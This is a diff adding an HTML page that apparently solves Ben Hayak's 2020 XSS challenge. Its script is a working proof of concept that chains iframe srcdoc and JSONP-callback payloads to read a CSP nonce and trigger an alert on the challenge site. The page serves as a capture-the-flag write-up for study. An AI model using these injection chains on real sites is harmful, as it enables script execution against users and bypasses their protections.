@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>2020 XSS challenge | Solution</title>
+    <meta charset="utf-8">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="terjanq">
+    <meta name="twitter:title" content="2020 XSS challenge | Solution">
+    <meta name="twitter:description" content="Solution to 2020 XSS challenge from Ben Hayak">
+    <meta name="twitter:image" content="https://i.imgur.com/tKxj0Ui.png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/night-owl.min.css">
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/markdown-it/11.0.0/markdown-it.min.js"></script>
+    <link rel="preload" as="image" href="bg.jpg">
+    <link rel="stylesheet" href="style.css">
+    <script src="misc.js"></script>
+    <script src="solhl.js"></script>
+   </head>
+
+<body>
+    <div id=intro class=window>
+        <span class=title>Intro</span>
+        <h1> Solution to <a target="_blank" href="http://challenge.benhayak.com/mini_2020/">2020 XSS challenge</a></h1>
+
+        <p>
+
+        <h2>The challenge</h2>
+
+        <details>
+            <summary>index.html</summary>
+            <pre><code class="language-html" id="codeHTML"></code></pre>
+        </details>
+        
+        <details>
+            <summary>/connect.php?client_id=aaa&callback=alert</summary>
+            <pre><code class="language-js" id="codeCB"></code></pre>
+        </details>
+        <h2>Writeup</h2>
+        <a target=_blank href="http://www.benhayak.com/2019/07/blog-post.html">Leveraging JSONP to SOME via HTTP Parameter Pollution</a>
+        <h2>Solution</h2>
+        <button onclick=solve_all()>Execute PoC (35 char, all)</button>
+        <button onclick=solve_firefox()>Execute PoC (32 char, Firefox only)</button>
+    </div>
+
+    <div class=window>
+        <span class=title>Proof of Concept</span>
+        <pre class=main><code id=code class="language-html"></code></pre>
+    </div>
+
+    <div class="prettyprint" id=solution>
+    <div id=iframes></div>
+        <script>
+            function ii(p, cb, name=''){
+                console.log(`Payload ${p}\nLength: ${p.length}`);
+                return new Promise(r=>{
+                    let i = document.createElement('iframe');
+                    i.name = name;
+                    i.src = `http://challenge.benhayak.com/mini_2020/?client_id=${escape(p)}%26callback=${cb}`
+                    iframes.appendChild(i);
+                    i.onload = r;
+                    iframes.append('\n');
+                })
+            }
+
+            function solve_all(){
+                iframes.innerHTML = '\n';
+                (async()=>{
+                    await ii(`<iframe srcdoc='<script><\/script>'>`, 'rules.push', 'x');
+                    await ii(`<iframe srcdoc='<script><\/script>'>`, 'top.x.rules.push', 'x1');
+                    await ii('1337', 'top.x.init', 'x2');
+                    await ii(`';top.x.s=parent.document.all//`, 'top.x.itemsList.lastChild.previousSibling.previousSibling.previousSibling.firstElementChild.contentDocument.head.firstChild.append', 'x3');
+                    await ii(`';alert(top.x.s.item(4).nonce)//`, 'top.x.itemsList.lastChild.previousSibling.firstElementChild.contentDocument.head.firstChild.append', 'x4');
+                })();
+
+                /*
+                    <iframe srcdoc='<script><\/script>'> // 35
+                    ';top.x.s=parent.document.all//     // 31
+                    ';alert(top.x.s.item(4).nonce)//    // 32
+                */
+            }
+            function solve_firefox(){
+                iframes.innerHTML = '\n';
+                (async()=>{
+                    await ii(`<iframe srcdoc='<svg><script/>'>`, 'rules.push', 'x');
+                    await ii(`<iframe srcdoc='<svg><script/>'>`, 'top.x.rules.push', 'x1');
+                    await ii('1337', 'top.x.init', 'x2');
+                    await ii(`';top.x.s=parent.document.all//`, 'top.x.itemsList.lastChild.previousSibling.previousSibling.previousSibling.firstElementChild.contentDocument.body.firstChild.firstChild.append', 'x3');
+                    await ii(`';alert(top.x.s.item(4).nonce)//`, 'top.x.itemsList.lastChild.previousSibling.firstElementChild.contentDocument.body.firstChild.firstChild.append', 'x4');
+                })();
+                /* 
+                    <iframe srcdoc='<svg><script/>'> // 32
+                */
+            }
+        </script>
+    </div>
+
+</body>
+
+</html>
